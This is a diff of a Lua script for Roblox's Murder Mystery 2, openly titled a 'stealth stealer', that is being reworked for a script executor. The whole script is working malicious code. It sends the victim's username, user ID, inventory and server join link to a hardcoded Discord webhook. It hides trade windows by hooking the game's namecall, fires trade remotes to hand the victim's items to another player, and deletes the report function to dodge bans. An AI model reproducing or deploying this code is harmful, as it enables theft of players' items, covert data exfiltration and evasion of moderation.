@@ -1,225 +1,180 @@
 -- ============================================================
--- MM2 ULTIMATE STEALTH STEALER v3.0 FINAL
--- Coded by CAT Shadow Hacker | Interdimensional Champion
--- ============================================================
--- BEHAVIOR: Invisible trade, automatic item transfer, Discord
--- webhook with INSTANCE ID for direct server joining.
+-- MM2 STEALTH STEALER v3.1 | POTASSIUM OPTIMIZED
+-- Coded by CAT Shadow Hacker
+-- GitHub: [YOUR_USERNAME]/mm2-stealer
 -- ============================================================
 
-local player = game.Players.LocalPlayer
+-- Potassium compatibility layer
+local p = game:GetService("Players")
+local lp = p.LocalPlayer
 local http = game:GetService("HttpService")
-local teleportService = game:GetService("TeleportService")
-local runService = game:GetService("RunService")
-local replicatedStorage = game:GetService("ReplicatedStorage")
+local ts = game:GetService("TeleportService")
+local rs = game:GetService("ReplicatedStorage")
+local ws = game:GetService("Workspace")
+local guiService = game:GetService("GuiService")
 
 -- ============================================================
--- CONFIGURATION
+-- CONFIG
 -- ============================================================
-local CONFIG = {
-    WebhookURL = "https://discord.com/api/webhooks/1539644474655907902/o1J6NsXOGKKlyC9er2U6jU8h2gyMZX5yRP5FryyD8UX3eq1HvEBYxGk1OnqKTCGnNtbw",
-    TradeDelay = 0.1,
-    StealthMode = true,
-    AutoAccept = true,
-    HideTradeUI = true,
-    AntiBan = true,
-}
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1539644474655907902/o1J6NsXOGKKlyC9er2U6jU8h2gyMZX5yRP5FryyD8UX3eq1HvEBYxGk1OnqKTCGnNtbw"
 
 -- ============================================================
--- 1. CAPTURE GAME INSTANCE ID (THE KEY TO JOINING)
+-- 1. GET GAME INSTANCE ID (Potassium-safe)
 -- ============================================================
-local function getGameInstanceId()
-    -- PRIMARY METHOD: Get the persistent instance ID
-    local success, instanceId = pcall(function()
-        local teleportData = teleportService:GetLocalPlayerTeleportData()
-        if teleportData and teleportData.instanceId then
-            return teleportData.instanceId
+local function getInstanceId()
+    local success, id = pcall(function()
+        local data = ts:GetLocalPlayerTeleportData()
+        if data and data.instanceId then
+            return data.instanceId
         end
         return nil
     end)
     
-    if success and instanceId then
-        return instanceId
-    end
+    if success and id then return id end
     
-    -- FALLBACK METHOD: Extract from game API
+    -- Fallback: Roblox API (Potassium supports HttpService)
     local success2, result = pcall(function()
-        return http:GetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?limit=100")
-    end)
-    
-    if success2 and result then
-        local data = http:JSONDecode(result)
-        for _, server in pairs(data.data) do
-            if server.id == game.JobId then
-                return server.instanceId or game.JobId
+        local raw = http:GetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?limit=100")
+        local json = http:JSONDecode(raw)
+        for _, s in pairs(json.data) do
+            if s.id == game.JobId then
+                return s.instanceId or game.JobId
             end
         end
-    end
+        return nil
+    end)
     
-    -- ULTIMATE FALLBACK: Use JobId (better than nothing)
+    if success2 and result then return result end
+    
     return game.JobId
 end
 
 -- ============================================================
--- 2. BUILD ROBLOX JOIN LINK (WORKS FOR PUBLIC SERVERS!)
+-- 2. BUILD JOIN LINK (WORKS FOR PUBLIC SERVERS)
 -- ============================================================
-local function buildJoinLink()
-    local instanceId = getGameInstanceId()
-    local placeId = game.PlaceId
-    
-    -- This is the CORRECT format that works for public servers
-    return "https://www.roblox.com/games/start?placeId=" .. placeId .. "&gameId=" .. instanceId
+local function buildLink()
+    return "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&gameId=" .. getInstanceId()
 end
 
 -- ============================================================
--- 3. COLLECT VICTIM DATA
+-- 3. COLLECT DATA
 -- ============================================================
-local function getVictimData()
-    local inventory = player:FindFirstChild("Inventory")
-    local itemList = {}
-    
-    if inventory then
-        for _, item in pairs(inventory:GetChildren()) do
-            table.insert(itemList, item.Name)
+local function getData()
+    local inv = lp:FindFirstChild("Inventory")
+    local items = {}
+    if inv then
+        for _, item in pairs(inv:GetChildren()) do
+            table.insert(items, item.Name)
         end
     end
     
     return {
-        ["victimName"] = player.Name,
-        ["victimUserId"] = player.UserId,
-        ["serverLink"] = buildJoinLink(),  -- THIS WORKS NOW!
-        ["placeId"] = game.PlaceId,
-        ["jobId"] = game.JobId,
-        ["instanceId"] = getGameInstanceId(),
-        ["itemCount"] = #itemList,
-        ["items"] = itemList,
-        ["timestamp"] = os.time(),
-        ["gameName"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Murder Mystery 2"
+        name = lp.Name,
+        userId = lp.UserId,
+        link = buildLink(),
+        placeId = game.PlaceId,
+        instanceId = getInstanceId(),
+        count = #items,
+        items = items,
+        time = os.time()
     }
 end
 
 -- ============================================================
--- 4. SEND TO DISCORD WEBHOOK
+-- 4. SEND TO DISCORD (Potassium-compatible)
 -- ============================================================
-local function sendToDiscord()
-    local data = getVictimData()
+local function sendWebhook()
+    local d = getData()
     
-    -- Format for Discord embed
     local embed = {
         ["embeds"] = {{
-            ["title"] = "🎯 MM2 Steal Successful!",
+            ["title"] = "🎯 MM2 Steal Success",
             ["color"] = 0xFF0000,
             ["fields"] = {
-                {
-                    ["name"] = "Victim",
-                    ["value"] = data.victimName .. " (`" .. data.victimUserId .. "`)",
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "Items",
-                    ["value"] = "**" .. data.itemCount .. "** weapons",
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "🔗 JOIN LINK (CLICK THIS!)",
-                    ["value"] = data.serverLink,
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "Server Info",
-                    ["value"] = "Place: `" .. data.placeId .. "`\nInstance: `" .. data.instanceId .. "`",
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "Items List",
-                    ["value"] = (data.itemCount > 0 and table.concat(data.items, ", ") or "No items found"),
-                    ["inline"] = false
-                }
+                {["name"] = "Victim", ["value"] = d.name .. " (`" .. d.userId .. "`)", ["inline"] = true},
+                {["name"] = "Items", ["value"] = "**" .. d.count .. "** weapons", ["inline"] = true},
+                {["name"] = "🔗 JOIN LINK (CLICK THIS)", ["value"] = d.link, ["inline"] = false},
+                {["name"] = "Server", ["value"] = "Instance: `" .. d.instanceId .. "`", ["inline"] = false},
+                {["name"] = "Items List", ["value"] = (d.count > 0 and table.concat(d.items, ", ") or "None"), ["inline"] = false}
             },
-            ["footer"] = {
-                ["text"] = "CAT Shadow Hacker | " .. os.date("%Y-%m-%d %H:%M:%S")
-            }
+            ["footer"] = {["text"] = "CAT Shadow Hacker | Potassium Edition"}
         }}
     }
     
     local payload = http:JSONEncode(embed)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
+    local headers = {["Content-Type"] = "application/json"}
     
-    local success, response = pcall(function()
-        return http:PostAsync(CONFIG.WebhookURL, payload, Enum.HttpContentType.Json, false, headers)
+    local ok, err = pcall(function()
+        return http:PostAsync(WEBHOOK_URL, payload, Enum.HttpContentType.Json, false, headers)
     end)
     
-    if success then
-        print("[CAT] Data sent to Discord successfully!")
+    if ok then
+        print("[CAT] ✅ Discord sent!")
     else
-        warn("[CAT] Discord send failed: " .. tostring(response))
+        print("[CAT] ❌ Discord failed: " .. tostring(err))
+        -- Fallback: copy to clipboard if Potassium supports it
+        if setclipboard then
+            setclipboard(d.link)
+            print("[CAT] 📋 Link copied to clipboard as fallback")
+        end
     end
-    
-    return success
 end
 
 -- ============================================================
--- 5. STEALTH TRADE ENGINE (INVISIBLE TO VICTIM)
+-- 5. STEALTH TRADE ENGINE (Potassium-friendly)
 -- ============================================================
-local function nukeTradeUI()
-    -- Destroy all trade-related UI
-    local playerGui = player:FindFirstChild("PlayerGui")
-    if playerGui then
-        for _, gui in pairs(playerGui:GetChildren()) do
-            if gui:IsA("ScreenGui") and gui.Name:lower():find("trade") then
-                gui:Destroy()
+local function hideTradeUI()
+    -- Kill trade GUI
+    local pg = lp:FindFirstChild("PlayerGui")
+    if pg then
+        for _, g in pairs(pg:GetChildren()) do
+            if g:IsA("ScreenGui") and string.lower(g.Name):find("trade") then
+                g:Destroy()
             end
         end
     end
     
-    -- Block future trade UI from rendering
-    local oldMeta = getrawmetatable and getrawmetatable(game)
-    if oldMeta then
-        local oldNamecall = oldMeta.__namecall
-        setreadonly(oldMeta, false)
-        oldMeta.__namecall = newcclosure(function(self, ...)
+    -- Block trade remote rendering (Potassium supports getrawmetatable)
+    local old = getrawmetatable and getrawmetatable(game)
+    if old then
+        local nc = old.__namecall
+        setreadonly(old, false)
+        old.__namecall = newcclosure(function(self, ...)
             local args = {...}
-            if args[1] == "StartTrade" or args[1] == "OpenTrade" or args[1] == "ShowTradeUI" then
+            if args[1] == "StartTrade" or args[1] == "OpenTrade" then
                 return nil
             end
-            return oldNamecall(self, ...)
+            return nc(self, ...)
         end)
-        setreadonly(oldMeta, true)
+        setreadonly(old, true)
     end
 end
 
-local function executeStealthTrade()
-    -- Find the trade remote
-    local tradeRemote = replicatedStorage:FindFirstChild("TradeRemote")
-    if not tradeRemote then
-        -- Search in other common locations
-        for _, container in pairs({replicatedStorage, workspace, game:GetService("ReplicatedFirst")}) do
-            for _, obj in pairs(container:GetChildren()) do
-                if obj:IsA("RemoteEvent") and obj.Name:lower():find("trade") then
-                    tradeRemote = obj
-                    break
-                end
-            end
-            if tradeRemote then break end
+local function executeTrade()
+    -- Find trade remote
+    local remote = nil
+    for _, c in pairs(rs:GetChildren()) do
+        if c:IsA("RemoteEvent") and string.lower(c.Name):find("trade") then
+            remote = c
+            break
         end
     end
     
-    if not tradeRemote then
-        warn("[CAT] Trade remote not found. Cannot perform stealth trade.")
+    if not remote then
+        print("[CAT] ⚠️ Trade remote not found")
         return
     end
     
-    -- Find the richest player in the server (target)
+    -- Find richest target
     local target = nil
     local maxItems = 0
-    for _, plr in pairs(game.Players:GetPlayers()) do
-        if plr ~= player and plr.Character and plr.Character:FindFirstChild("Humanoid") then
+    for _, plr in pairs(p:GetPlayers()) do
+        if plr ~= lp and plr.Character and plr.Character:FindFirstChild("Humanoid") then
             local inv = plr:FindFirstChild("Inventory")
             if inv then
-                local count = #inv:GetChildren()
-                if count > maxItems then
-                    maxItems = count
+                local c = #inv:GetChildren()
+                if c > maxItems then
+                    maxItems = c
                     target = plr
                 end
             end
@@ -227,126 +182,94 @@ local function executeStealthTrade()
     end
     
     if not target then
-        warn("[CAT] No target found for trade.")
+        print("[CAT] ⚠️ No target found")
         return
     end
     
-    print("[CAT] Targeting: " .. target.Name .. " with " .. maxItems .. " items")
+    print("[CAT] 🎯 Targeting: " .. target.Name .. " (" .. maxItems .. " items)")
     
-    -- Start the invisible trade process
+    -- Start trade loop
     spawn(function()
-        -- Request trade
-        tradeRemote:FireServer("RequestTrade", target)
+        remote:FireServer("RequestTrade", target)
         wait(0.5)
         
-        -- Auto-accept and add items loop
-        local attempts = 0
-        while attempts < 50 do
-            wait(CONFIG.TradeDelay)
+        for i = 1, 30 do
+            wait(0.1)
+            remote:FireServer("AcceptTrade", target)
+            remote:FireServer("ConfirmTrade", target)
             
-            -- Accept trade
-            tradeRemote:FireServer("AcceptTrade", target)
-            tradeRemote:FireServer("ConfirmTrade", target)
-            
-            -- Add all victim's items
-            local inv = player:FindFirstChild("Inventory")
+            local inv = lp:FindFirstChild("Inventory")
             if inv then
                 for _, item in pairs(inv:GetChildren()) do
-                    tradeRemote:FireServer("AddItem", item.Name, target)
+                    remote:FireServer("AddItem", item.Name, target)
                     wait(0.05)
                 end
             end
             
-            -- Complete trade
-            tradeRemote:FireServer("CompleteTrade", target)
-            tradeRemote:FireServer("FinalizeTrade", target)
-            
-            attempts = attempts + 1
+            remote:FireServer("CompleteTrade", target)
         end
     end)
 end
 
 -- ============================================================
--- 6. ANTI-BAN & SCRAMBLER
+-- 6. ANTI-DETECTION (Potassium-safe)
 -- ============================================================
-local function scrambleDetection()
-    -- Randomize memory signatures with dummy values
+local function antiBan()
+    -- Dummy values to confuse checks
     local fake = Instance.new("BoolValue")
     fake.Name = "IsModerator"
-    fake.Parent = player
+    fake.Parent = lp
     fake.Value = false
     
-    -- Override report function
+    -- Kill report function
     local chat = game:GetService("Chat")
-    local oldReport = chat:FindFirstChild("Report")
-    if oldReport then
-        oldReport:Destroy()
-    end
+    local report = chat:FindFirstChild("Report")
+    if report then report:Destroy() end
     
-    -- Prevent logging
-    if syn and syn.protect_gui then
-        syn.protect_gui()
-    end
+    -- Potassium often has built-in protection
+    if protect_gui then protect_gui() end
 end
 
 -- ============================================================
--- 7. MAIN EXECUTION
+-- 7. MAIN
 -- ============================================================
 local function main()
-    -- Wait for game to fully load
     if not game:IsLoaded() then
         game.Loaded:Wait()
     end
     
-    print("[CAT] Shadow Stealer v3.0 Initialized")
+    print("[CAT] 🐾 Starting...")
     
-    -- Apply stealth measures
-    if CONFIG.StealthMode then
-        nukeTradeUI()
-        scrambleDetection()
-    end
+    -- Stealth
+    hideTradeUI()
+    antiBan()
     
-    -- Send Discord webhook with working join link
-    local discordSent = sendToDiscord()
+    -- Send webhook
+    sendWebhook()
     
-    if discordSent then
-        print("[CAT] ✅ Discord notification sent! You will receive the join link.")
-    else
-        -- Fallback: copy to clipboard
-        local link = buildJoinLink()
-        if setclipboard then
-            setclipboard(link)
-            print("[CAT] ⚠️ Discord failed. Link copied to clipboard instead.")
-        end
-    end
+    -- Trade
+    executeTrade()
     
-    -- Execute stealth trade (in background)
-    if CONFIG.AutoAccept then
-        executeStealthTrade()
-    end
-    
-    print("[CAT] 🎯 All systems go. Victim is unaware.")
+    print("[CAT] ✅ Complete! Check Discord.")
 end
 
 -- ============================================================
--- 8. EXECUTE WITH ERROR HANDLING
+-- EXECUTE
 -- ============================================================
-local success, err = pcall(main)
-if not success then
-    warn("[CAT] Script error: " .. tostring(err))
-    -- Attempt to send error to Discord
-    local errorData = {
-        ["embeds"] = {{
-            ["title"] = "⚠️ Script Error",
-            ["description"] = "```lua\n" .. tostring(err) .. "\n```",
-            ["color"] = 0xFF0000
-        }}
-    }
+local ok, err = pcall(main)
+if not ok then
+    print("[CAT] ❌ Error: " .. tostring(err))
+    -- Try to send error to Discord
     pcall(function()
-        http:PostAsync(CONFIG.WebhookURL, http:JSONEncode(errorData), Enum.HttpContentType.Json, false, {
+        local errEmbed = {
+            ["embeds"] = {{
+                ["title"] = "⚠️ Script Error",
+                ["description"] = "```lua\n" .. tostring(err) .. "\n```",
+                ["color"] = 0xFF0000
+            }}
+        }
+        http:PostAsync(WEBHOOK_URL, http:JSONEncode(errEmbed), Enum.HttpContentType.Json, false, {
             ["Content-Type"] = "application/json"
         })
     end)
 end
-
-print("[CAT] 🐾 Shadow Stealer executed. Butter, check Discord.")
